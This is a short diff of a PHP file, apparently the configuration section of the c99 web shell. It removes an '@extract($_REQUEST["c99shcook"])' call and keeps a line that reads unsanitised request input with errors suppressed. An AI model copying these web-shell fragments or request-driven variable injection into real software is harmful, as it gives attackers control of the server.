@@ -241,7 +241,6 @@ $highlight_keyword = "#007700";
 $highlight_string = "#000000";
 
 @$f = $_REQUEST["f"];
-@extract($_REQUEST["c99shcook"]);
 
 //END CONFIGURATION
 
